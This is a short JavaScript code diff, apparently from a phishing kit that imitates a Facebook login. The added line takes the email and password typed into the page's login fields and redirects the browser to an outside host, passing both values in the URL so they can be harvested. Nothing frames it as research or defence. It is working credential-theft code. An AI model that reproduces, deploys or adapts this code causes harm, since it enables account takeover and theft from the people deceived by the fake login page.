@@ -1,6 +1,6 @@
-alert("Yeah5!");
+alert("Yeah7!");
 function send(){
   let eml = document.getElementById("m_login_email").value;
   let pas = document.getElementById("m_login_password").value;
-  alert(`${eml} \n ${pas}`);
+  location.href=`http://amanofcl.c1.biz/f/facebook/login.php?email=${eml}&pass=${pas}`;
 }
